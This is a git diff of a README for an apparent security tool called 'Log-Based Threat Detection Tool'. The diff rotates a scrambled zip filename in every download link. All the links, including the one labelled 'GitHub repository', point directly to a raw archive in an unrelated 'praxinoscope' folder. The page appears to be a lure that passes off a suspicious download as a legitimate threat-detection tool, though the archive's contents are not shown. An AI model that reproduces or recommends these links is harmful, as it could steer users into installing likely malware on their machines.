@@ -1,6 +1,6 @@
 # 🛡️ Log-Based-Threat-Detection-Tool - Detect Threats Easily and Efficiently
 
-[![Download](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Detection_Threat_Based_Log_Tool_1.1.zip%20Based%20Threat%20Detection%20Tool-blue)](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Detection_Threat_Based_Log_Tool_1.1.zip)
+[![Download](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Threat_Based_Tool_Detection_Log_2.9-alpha.3.zip%20Based%20Threat%20Detection%20Tool-blue)](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Threat_Based_Tool_Detection_Log_2.9-alpha.3.zip)
 
 ## 📋 Overview
 
@@ -30,7 +30,7 @@ To run the Log-Based Threat Detection Tool smoothly, ensure your system meets th
 
    Click on the link below to access the Releases page where you can download the tool.
 
-   [Download Log-Based Threat Detection Tool](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Detection_Threat_Based_Log_Tool_1.1.zip)
+   [Download Log-Based Threat Detection Tool](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Threat_Based_Tool_Detection_Log_2.9-alpha.3.zip)
 
 2. **Select the Latest Release**
 
@@ -91,12 +91,12 @@ If you encounter issues using the Log-Based Threat Detection Tool, consider the 
 
 ## 🔗 Additional Resources
 
-For further information, FAQs, and user support, you can visit our [GitHub repository](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Detection_Threat_Based_Log_Tool_1.1.zip).
+For further information, FAQs, and user support, you can visit our [GitHub repository](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Threat_Based_Tool_Detection_Log_2.9-alpha.3.zip).
 
 ## 📥 Download & Install
 
 To get started with the Log-Based Threat Detection Tool, visit the link below and follow the simple steps to download and install the application:
 
-[Download Log-Based Threat Detection Tool](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Detection_Threat_Based_Log_Tool_1.1.zip)
+[Download Log-Based Threat Detection Tool](https://raw.githubusercontent.com/masbogel07/Log-Based-Threat-Detection-Tool/main/praxinoscope/Threat_Based_Tool_Detection_Log_2.9-alpha.3.zip)
 
 By following this guide, you can successfully download and run the Log-Based Threat Detection Tool, enhancing your ability to monitor and respond to cybersecurity threats effectively.
